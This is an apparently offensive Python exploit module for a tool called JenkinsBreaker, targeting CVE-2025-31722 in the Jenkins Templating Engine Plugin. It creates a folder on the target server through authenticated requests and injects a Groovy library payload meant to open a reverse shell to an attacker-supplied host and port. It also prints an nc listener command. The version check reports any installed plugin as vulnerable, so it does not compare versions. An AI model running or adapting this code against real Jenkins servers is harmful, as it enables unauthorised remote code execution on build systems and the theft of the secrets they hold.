"""
CVE-2025-31722: Jenkins Templating Engine Plugin RCE

This exploit targets the Templating Engine Plugin in Jenkins to achieve remote code execution
by injecting malicious library definitions.
"""

from rich.console import Console
import requests
import logging
import time
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2025-31722"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Templating Engine Plugin RCE",
    description="Remote code execution via malicious library injection in Templating Engine Plugin",
    affected_versions=["Templating Engine Plugin <= 2.5.3"],
    mitre_attack=["T1190", "T1059"],
    severity="critical",
    references=[
        "https://www.jenkins.io/security/advisory/2025-01-15/",
        "https://nvd.nist.gov/vuln/detail/CVE-2025-31722"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "plugin-exploit", "code-injection"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the Templating Engine Plugin is installed and vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/pluginManager/api/json?tree=plugins[shortName,version]"
        r = requests.get(url, auth=tool.auth, verify=False, timeout=5)
        
        if r.status_code == 200:
            plugins = r.json().get('plugins', [])
            for plugin in plugins:
                if plugin.get('shortName') == 'templating-engine':
                    version = plugin.get('version', '')
                    console.print(f"[cyan][*] Found Templating Engine Plugin version {version}[/cyan]")
                    return True
        return False
    except:
        return False


def run(tool, lhost=None, lport=None, auth=None, headers=None, proxies=None, delay=0, **kwargs):
    """
    Exploit CVE-2025-31722 for remote code execution.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        auth: Authentication tuple (optional, uses tool.auth if not provided)
        headers: Custom headers (optional)
        proxies: Proxy configuration (optional)
        delay: Delay between requests
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    logging.info(f"Attempting Templating Engine RCE ({CVE_ID})")
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Templating Engine RCE)...[/yellow]")
    
    if not lhost or not lport:
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details="Missing required parameters: lhost and lport"
        )
    
    if delay:
        time.sleep(delay)
    
    auth = auth or tool.auth
    headers = headers or {}
    proxies = proxies or tool.proxies
    
    folder_name = kwargs.get('folder_name', 'breaker-folder')
    payload = f"""@Library('malicious') import malicious; new malicious("{lhost}", {lport}).run()"""
    
    headers.update({"Content-Type": "application/x-www-form-urlencoded"})
    
    from JenkinsBreaker import CrumbManager
    crumb_manager = CrumbManager(tool.jenkins_url, auth=auth, headers=headers, proxies=proxies, delay=delay)
    headers = crumb_manager.inject(headers)
    
    create_folder_url = f"{tool.jenkins_url}/createItem?name={folder_name}&mode=com.cloudbees.hudson.plugins.folder.Folder"
    
    try:
        r = requests.post(create_folder_url, headers=headers, auth=auth, proxies=proxies, verify=False, timeout=5)
        if r.status_code not in [200, 201]:
            console.print(f"[red][!] Failed to create folder {folder_name}: {r.status_code}[/red]")
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Failed to create folder: {r.status_code}"
            )
    except Exception as e:
        console.print(f"[red][!] Error creating folder: {e}[/red]")
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details=f"Error creating folder: {str(e)}"
        )
    
    config_url = f"{tool.jenkins_url}/job/{folder_name}/configure"
    config_data = {
        "name": "malicious",
        "script": payload,
        "submit": "Save"
    }
    
    try:
        r = requests.post(config_url, headers=headers, data=config_data, auth=auth, proxies=proxies, verify=False, timeout=10)
        if r.status_code == 200:
            console.print(f"[green][+] Successfully injected malicious library in {folder_name}[/green]")
            console.print(f"[yellow][!] Start listener: nc -nlvp {lport}[/yellow]")
            
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details="Injected malicious library successfully",
                data={
                    "folder": folder_name,
                    "lhost": lhost,
                    "lport": lport,
                    "payload": payload
                }
            )
        else:
            console.print(f"[red][!] Failed to configure library: {r.status_code}[/red]")
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Failed to configure library: {r.status_code}"
            )
    except Exception as e:
        console.print(f"[red][!] Error exploiting Templating Engine Plugin: {e}[/red]")
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details=f"Exploitation error: {str(e)}"
        )
